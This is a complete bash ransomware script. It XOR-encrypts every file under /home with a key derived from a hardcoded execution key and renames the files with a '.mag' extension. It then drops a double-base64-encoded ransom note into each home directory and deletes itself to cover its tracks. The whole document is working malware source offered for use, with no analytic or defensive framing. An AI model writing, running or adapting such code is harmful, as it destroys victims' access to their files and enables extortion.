#!/bin/bash

# Function to XOR encrypt/decrypt a file
xor_encrypt_decrypt() {
    local file_path="$1"
    local key="$2"
    local temp_file="${file_path}.tmp"

    i=0
    while IFS= read -r -n1 char || [[ -n "$char" ]]; do
        key_char=${key:$((i % ${#key})):1}
        printf \\$(printf '%03o' $(( $(printf '%d' "'$char") ^ $(printf '%d' "'$key_char") ))) >> "$temp_file"
        ((i++))
    done < "$file_path"

    mv "$temp_file" "$file_path"
}

# Generate an MD5 hash of a string
generate_md5_hash() {
    echo -n "$1" | md5sum | awk '{print $1}'
}

# Derive the encryption key based on the execution key
derive_encryption_key() {
    local hash_value
    hash_value=$(generate_md5_hash "1777")
    echo "${hash_value: -4}" # Use the last 4 characters of the hash
}

# Validate the execution key
validate_execution_key() {
    if [[ "$1" != "1777" ]]; then
        echo "Invalid execution key!"
        exit 1
    fi
}

# Generate a ransom note and place it in all home directories
generate_ransom_note_for_all() {
    local encoded_note="SVNFaElFOVBVRk1zSUZkRklFUkpSQ0JCSUZSSVNVNUhJQ0VoSVFvS1NHa2dkR2hsY21Vc0lIUm9hWE1nYVhNZ2VXOTFjaUJtY21sbGJtUnNlU0J1WldsbmFHSnZjbWh2YjJRZ0treGxlbUZ5ZFhNcUlHZHliM1Z3SVNBZ0NsZGxJRzFoZVNCdmNpQnRZWGtnYm05MElHaGhkbVVnWVdOamFXUmxiblJoYkd4NUlHVnVZM0o1Y0hSbFpDQjViM1Z5SUdacGJHVnpMaUJYYUc5dmNITnBaU0VnOEorWWhTQWdDZ3BDZFhRZ1pHOXU0b0NaZENCM2IzSnllU3dnZDJVZ1kyRnVJSFJ2ZEdGc2JIa2dabWw0SUhSb2FYUGlnS1lnWm05eUlIUm9aU0J6YldGc2JDQndjbWxqWlNCdlppQXFLakV3TUNCQ1ZFTXFLaTRnSUFwWGFIa2dNVEF3SUVKVVF6OGdWMlZzYkN3Z2QyVWdibVZsWkNCamIyWm1aV1VzSUhOdVlXTnJjeXdnWVc1a0lHMWhlV0psSUdFZ2RISnZjR2xqWVd3Z2RtRmpZWFJwYjI0dUlDQUtDbE5sYm1RZ2VXOTFjaUIwYjNSaGJHeDVJR2RsYm1WeWIzVnpJR1J2Ym1GMGFXOXVJR2hsY21VNklDQUtLaW94VEdWYVlYSlZjMEpVUTJGa1JGSkZVMU14TWpNME5UWTNPRGt3S2lvS0NrOXVZMlVnZVc5MUozSmxJR1psWld4cGJtY2daMlZ1WlhKdmRYTXNJR1Z0WVdsc0lIVnpJR0YwSUNvcWMzVndjRzl5ZEVCc1pYcGhjblZ6TG5oNWVpb3FMaUFnQ2xkbDRvQ1piR3dnYzJWdVpDQjViM1VnZEdobElHMWhaMmxqSUhKbFkybHdaU0IwYnlCblpYUWdlVzkxY2lCbWFXeGxjeUJpWVdOckxpQWdDZ3BRTGxNdUlFbG1JSGx2ZFNCMGNua2dkRzhnWW5KbFlXc2diM1Z5SUdWdVkzSjVjSFJwYjI0c0lIZGw0b0NaYkd3Z2FuVnpkQ0JzWVhWbmFDQmlaV05oZFhObExDQjNaV3hzTENCdFlYUm9JR2x6SUdoaGNtUXVJQ0FLQ2toaGRtVWdZU0JuY21WaGRDQmtZWGtzSUdGdVpDQmtiMjdpZ0psMElHWnZjbWRsZENCMGJ5QmlZV05ySUhWd0lIbHZkWElnWm1sc1pYTWdibVY0ZENCMGFXMWxJU0R3bjVpSklDQUtMU0JNYjNabExDQk1aWHBoY25WeklPS2RwTys0andvPQ=="
    local decoded_note

    decoded_note=$(echo "$encoded_note" | base64 -d | base64 -d)

    for dir in /home/*; do
        if [[ -d "$dir" ]]; then
            echo "$decoded_note" > "$dir/readme.txt"
            echo "Ransom note created in: $dir/readme.txt"
        fi
    done
}

# Encrypt files in a target directory
encrypt_files() {
    local encryption_key="$1"
    local target_directory="$2"

    find "$target_directory" -type f 2>/dev/null | while read -r file; do
        local new_file="${file}.mag"
        xor_encrypt_decrypt "$file" "$encryption_key"
        mv "$file" "$new_file"
        echo "Encrypted: $new_file"
    done
}

# Self-delete the script
self_delete() {
    local script_path="$0"
    rm -f "$script_path" && echo "Script $script_path has been deleted."
}

# Main function
main() {
    validate_execution_key "$1"
    local encryption_key
    encryption_key=$(derive_encryption_key)

    local target_directory="/home"

    # Encrypt files
    encrypt_files "$encryption_key" "$target_directory"

    # Generate ransom notes
    generate_ransom_note_for_all

    # Delete the script
    self_delete
}

main "$@"
